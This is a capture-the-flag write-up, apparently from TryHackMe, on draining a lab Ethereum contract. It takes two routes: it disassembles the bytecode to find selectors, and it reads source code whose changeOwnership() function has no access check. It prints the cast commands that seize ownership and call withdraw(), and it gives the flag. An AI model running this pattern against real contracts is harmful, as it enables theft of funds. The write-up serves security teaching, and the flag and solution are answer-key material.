# Challenge description

A weakness in the Cipher's Smart Contract could drain all of the ETH in its treasury, thereby breaking the funding to the Phantom Node Botnet and disabling its global malicious operation.

Note: To start the target machine, click the Start Machine button:

Wait 1-2 minutes for the target machine to start. Once it has fully booted, the target machine IP will appear here:

10.10.94.98

You can then use the AttackBox or your own machine to attack the target machine's IP address.

```sh
root@attacker:~# RPC_URL=http://10.10.137.119:8545
root@attacker:~# API_URL=http://10.10.137.119
root@attacker:~# PRIVATE_KEY=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.private_key")
root@attacker:~# CONTRACT_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".contract_address")
root@attacker:~# PLAYER_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.address")
root@attacker:~# is_solved=`cast call $CONTRACT_ADDRESS "isSolved()(bool)" --rpc-url ${RPC_URL}`
root@attacker:~# echo "Check if is solved: $is_solved"
Check if is solved: false
```     

# Soluce

The first step is to configure the environment variables with the target machine's IP address. We can then use the given script to retrieve the private key, contract address, and player address.

After that, we can check if the challenge has been solved by calling the `isSolved()` function on the contract address. The output shows that the challenge has not been solved yet.

We can now use the `cast` tool to interact with the contract.

There is two ways to solve this challenge:

## 1. If you don't have the source code

We can get the contract code by calling the `code` function on the contract address:

```sh
┌──(virgile㉿localhost)-[~]
└─$ cast code $CONTRACT_ADDRESS --rpc-url $RPC_URL                                                                                                                                                                                          
0x608060405234801561001057600080fd5b506004361061007d5760003560e01c8063590791f21161005b578063590791f2146100bb57806364d98f6e146100cd5780638725f5ae146100dc578063893d20e8146100f357600080fd5b806312065fe01461008257806338cc4831146100975780633ccfd60b146100b1575b600080fd5b475b6040519081526020015b60405180910390f35b335b6040516001600160a01b03909116815260200161008e565b6100b9610104565b005b6001546001600160a01b031631610084565b6040514715815260200161008e565b6100b9600080546001600160a01b03191633179055565b6000546001600160a01b0316610099565b6000546001600160a01b0316331461014f5760405162461bcd60e51b815260206004820152600a6024820152694e6f74206f776e65722160b01b604482015260640160405180910390fd5b600080546040516001600160a01b03909116914780156108fc02929091818181858888f19350505050158015610189573d6000803e3d6000fd5b5056fea264697066735822122065569758b52086260875f23ffe1d1dc9c4a912fee4f4c6cae2b1c138104d045c64736f6c63430008140033
```

We can disassemble the code to understand its behavior (with [this script](code/heist.py)):

```sh
┌──(virgile㉿localhost)-[~]
└─$ python3 heist.py
PUSH1 0x80
PUSH1 0x40
MSTORE
CALLVALUE
DUP1
ISZERO
PUSH2 0x10
JUMPI
PUSH1 0x0
DUP1
REVERT
JUMPDEST
POP
PUSH1 0x4
CALLDATASIZE
LT
PUSH2 0x7d
JUMPI
PUSH1 0x0
CALLDATALOAD
PUSH1 0xe0
SHR
DUP1
PUSH4 0x590791f2
GT
PUSH2 0x5b
JUMPI
DUP1
PUSH4 0x590791f2
EQ
PUSH2 0xbb
JUMPI
DUP1
PUSH4 0x64d98f6e
EQ
PUSH2 0xcd
JUMPI
DUP1
PUSH4 0x8725f5ae
EQ
PUSH2 0xdc
JUMPI
DUP1
PUSH4 0x893d20e8
EQ
PUSH2 0xf3
JUMPI
PUSH1 0x0
DUP1
REVERT
JUMPDEST
DUP1
PUSH4 0x12065fe0
EQ
PUSH2 0x82
JUMPI
DUP1
PUSH4 0x38cc4831
EQ
PUSH2 0x97
JUMPI
DUP1
PUSH4 0x3ccfd60b
EQ
PUSH2 0xb1
JUMPI
JUMPDEST
PUSH1 0x0
DUP1
REVERT
JUMPDEST
SELFBALANCE
JUMPDEST
PUSH1 0x40
MLOAD
SWAP1
DUP2
MSTORE
PUSH1 0x20
ADD
JUMPDEST
PUSH1 0x40
MLOAD
DUP1
SWAP2
SUB
SWAP1
RETURN
JUMPDEST
CALLER
JUMPDEST
PUSH1 0x40
MLOAD
PUSH1 0x1
PUSH1 0x1
PUSH1 0xa0
SHL
SUB
SWAP1
SWAP2
AND
DUP2
MSTORE
PUSH1 0x20
ADD
PUSH2 0x8e
JUMP
JUMPDEST
PUSH2 0xb9
PUSH2 0x104
JUMP
JUMPDEST
STOP
JUMPDEST
PUSH1 0x1
SLOAD
PUSH1 0x1
PUSH1 0x1
PUSH1 0xa0
SHL
SUB
AND
BALANCE
PUSH2 0x84
JUMP
JUMPDEST
PUSH1 0x40
MLOAD
SELFBALANCE
ISZERO
DUP2
MSTORE
PUSH1 0x20
ADD
PUSH2 0x8e
JUMP
JUMPDEST
PUSH2 0xb9
PUSH1 0x0
DUP1
SLOAD
PUSH1 0x1
PUSH1 0x1
PUSH1 0xa0
SHL
SUB
NOT
AND
CALLER
OR
SWAP1
SSTORE
JUMP
JUMPDEST
PUSH1 0x0
SLOAD
PUSH1 0x1
PUSH1 0x1
PUSH1 0xa0
SHL
SUB
AND
PUSH2 0x99
JUMP
JUMPDEST
PUSH1 0x0
SLOAD
PUSH1 0x1
PUSH1 0x1
PUSH1 0xa0
SHL
SUB
AND
CALLER
EQ
PUSH2 0x14f
JUMPI
PUSH1 0x40
MLOAD
PUSH3 0x461bcd
PUSH1 0xe5
SHL
DUP2
MSTORE
PUSH1 0x20
PUSH1 0x4
DUP3
ADD
MSTORE
PUSH1 0xa
PUSH1 0x24
DUP3
ADD
MSTORE
PUSH10 0x4e6f74206f776e657221
PUSH1 0xb0
SHL
PUSH1 0x44
DUP3
ADD
MSTORE
PUSH1 0x64
ADD
PUSH1 0x40
MLOAD
DUP1
SWAP2
SUB
SWAP1
REVERT
JUMPDEST
PUSH1 0x0
DUP1
SLOAD
PUSH1 0x40
MLOAD
PUSH1 0x1
PUSH1 0x1
PUSH1 0xa0
SHL
SUB
SWAP1
SWAP2
AND
SWAP2
SELFBALANCE
DUP1
ISZERO
PUSH2 0x8fc
MUL
SWAP3
SWAP1
SWAP2
DUP2
DUP2
DUP2
DUP6
DUP9
DUP9
CALL
SWAP4
POP
POP
POP
POP
ISZERO
DUP1
ISZERO
PUSH2 0x189
JUMPI
RETURNDATASIZE
PUSH1 0x0
DUP1
RETURNDATACOPY
RETURNDATASIZE
PUSH1 0x0
REVERT
JUMPDEST
POP
JUMP
INVALID
LOG2
PUSH5 0x6970667358
INVALID
SLT
SHA3
PUSH6 0x569758b52086
INVALID
ADDMOD
PUSH22 0xf23ffe1d1dc9c4a912fee4f4c6cae2b1c138104d045c
PUSH5 0x736f6c6343
STOP
ADDMOD
EQ
STOP
CALLER
```

We can see that:

- If the selector is 0x590791f2, we jump to 0xbb.
- If the selector is 0x64d98f6e, we jump to 0xcd.
- If the selector is 0x8725f5ae, we jump to 0xdc.
- If the selector is 0x893d20e8, we jump to 0xf3.
- If the selector is 0x12065fe0, we jump to 0x82.
- If the selector is 0x38cc4831, we jump to 0x97.
- If the selector is 0x3ccfd60b, we jump to 0xb1 (this is the `withdraw()` function).

Now we can try to call all the functions to see what they do. We call a function and then check the balance of the contract to see if it has been drained (balance = 0).

The right selector is 0x8725f5ae, so we can call the function with the following command:

```sh
┌──(virgile㉿localhost)-[~]
└─$ cast send \
  --legacy \
  --rpc-url "$RPC_URL" \
  --private-key "$PRIVATE_KEY" \
  "$CONTRACT_ADDRESS" \
  0x8725f5ae

blockHash            0xe5725ac3f5f9502a0ab90322ff80cdb376ce008759e25579f5ab16e123706952
blockNumber          9
contractAddress      
cumulativeGasUsed    27075
effectiveGasPrice    1000000000
from                 0xB7E4C575D5d5bEfFB966596aF4eDb3dea9bE14d8
gasUsed              27075
logs                 []
logsBloom            0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root                 
status               1 (success)
transactionHash      0x6503cc4b836adbba91e6633804467b2ae2ed149de82b3448e5560063dabc39f9
transactionIndex     0
type                 0
blobGasPrice         
blobGasUsed          
authorizationList    
to                   0xf22cB0Ca047e88AC996c17683Cee290518093574

┌──(virgile㉿localhost)-[~]
└─$ cast send   --legacy   --rpc-url "$RPC_URL"   --private-key "$PRIVATE_KEY"   "$CONTRACT_ADDRESS"   "withdraw()"                                                                                                                         

blockHash            0xf5393d74033d60200498ddee922044e7982f9a2eff486a535bc9713c0df4bc15
blockNumber          10
contractAddress      
cumulativeGasUsed    30414
effectiveGasPrice    1000000000
from                 0xB7E4C575D5d5bEfFB966596aF4eDb3dea9bE14d8
gasUsed              30414
logs                 []
logsBloom            0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root                 
status               1 (success)
transactionHash      0x7a6db42bfd3767766c7fd647ba65252f2fa1df2db24129c13b24d487b4cbd096
transactionIndex     0
type                 0
blobGasPrice         
blobGasUsed          
authorizationList    
to                   0xf22cB0Ca047e88AC996c17683Cee290518093574

┌──(virgile㉿localhost)-[~]
└─$ cast balance "$CONTRACT_ADDRESS" --rpc-url "$RPC_URL" 
0

┌──(virgile㉿localhost)-[~]
└─$ is_solved=cast call $CONTRACT_ADDRESS "isSolved()(bool)" --rpc-url ${RPC_URL}

┌──(virgile㉿localhost)-[~]
└─$ echo "Check if is solved: $is_solved"                                                                                                                                                                                                   
Check if is solved: true
```

The contract has been drained, and the challenge is solved.

Now we can open the website with:

```sh
┌──(virgile㉿localhost)-[~]
└─$ xdg-open "$API_URL"
```

There is a button to claim the flag, and we can get the flag if the challenge is solved.

So the flag is `THM{web3_h31st_d0ne}`.

## 2. If you have the source code on the website

If you have an access to the source code on the website:

```sh
┌──(virgile㉿localhost)-[~]
└─$ xdg-open "$API_URL"
```

On the website, you can see the source code of the contract:

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Challenge {
    address private owner;
    address private initOwner;
    constructor() payable {
        owner = msg.sender;
        initOwner = msg.sender;
    }
    
    function changeOwnership() external {
            owner = msg.sender;
    }
    
    function withdraw() external {
        require(msg.sender == owner, "Not owner!");
        payable(owner).transfer(address(this).balance);
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    function getOwnerBalance() external view returns (uint256) {
        return address(initOwner).balance;
    }


    function isSolved() external view returns (bool) {
        return (address(this).balance == 0);
    }

    function getAddress() external view returns (address) {
        return msg.sender;
    }

     function getOwner() external view returns (address) {
        return owner;
    }
}
```

- The `withdraw()` function allows the owner to withdraw the contract's balance.
- The `isSolved()` function returns true if the contract's balance is 0.
- The `getOwner()` function returns the owner's address.
- The `getOwnerBalance()` function returns the owner's balance.
- The `getBalance()` function returns the contract's balance.
- The `getAddress()` function returns the caller's address.
- The `changeOwnership()` function allows the caller to change the owner's address.

So you have to call the `changeOwnership()` function to become the owner, and then call the `withdraw()` function to drain the contract.

```sh
cast send --legacy --rpc-url "$RPC_URL" --private-key "$PRIVATE_KEY" "$CONTRACT_ADDRESS" "changeOwnership()"
cast send --legacy --rpc-url "$RPC_URL" --private-key "$PRIVATE_KEY" "$CONTRACT_ADDRESS" "withdraw()"
```

The contract has been drained, and the challenge is solved.

Now we can open the website with:

```sh
xdg-open "$API_URL"
```

There is a button to claim the flag, and we can get the flag if the challenge is solved.

So the flag is `THM{web3_h31st_d0ne}`.